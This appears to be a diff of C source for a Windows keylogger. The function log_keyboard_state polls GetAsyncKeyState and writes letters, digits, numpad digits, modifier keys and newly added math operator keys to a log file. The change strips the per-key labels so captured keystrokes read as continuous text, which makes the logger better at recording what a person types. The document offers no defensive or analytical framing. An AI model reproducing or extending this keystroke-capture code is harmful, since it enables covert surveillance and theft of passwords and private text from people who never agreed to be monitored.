@@ -79,7 +79,7 @@ void log_keyboard_state( FILE * log_file )
 			{
 				// Put the character in capital letter if necessary
 				int ascii = ( is_cap ? i : (i+32) );
-				log_infos( log_file, "Keystroke : %c\n", ascii );
+				log_infos( log_file, "%c", ascii );
 			}
 		}
 		
@@ -88,7 +88,7 @@ void log_keyboard_state( FILE * log_file )
 		{
 			if( GetAsyncKeyState( i ) & KEY_PRESSED_STATE )
 			{
-				log_infos( log_file, "Keystroke : %01d\n", i - VK_0 );
+				log_infos( log_file, "%01d", i - VK_0 );
 			}
 		}
 		
@@ -96,16 +96,25 @@ void log_keyboard_state( FILE * log_file )
 		{
 			if( GetAsyncKeyState( i ) & KEY_PRESSED_STATE )
 			{
-				log_infos( log_file, "Keystroke : %01d\n", i - VK_NUMPAD0 );
+				log_infos( log_file, "%01d", i - VK_NUMPAD0 );
 			}
 		}
 		
-		// Text modifier keys
+		// Keys that alter the text stream
 		for( i = 0; i < NB_VKS_ALTER_STREAM; i++ )
 		{
 			if( GetAsyncKeyState( VKS_ALTER_STREAM[i] ) & KEY_PRESSED_STATE )
 			{
-				log_infos( log_file, "%s\n", VKS_ALTER_STREAM_TXT[i] );
+				log_infos( log_file, "\n%s", VKS_ALTER_STREAM_TXT[i] );
+			}
+		}
+		
+		// Mathematics operators keys
+		for( i = 0; i < NB_VKS_MATH; i++ )
+		{
+			if( GetAsyncKeyState( VKS_MATH[i] ) & KEY_PRESSED_STATE )
+			{
+				log_infos( log_file, "%s", VKS_MATH_TXT[i] );
 			}
 		}
 		
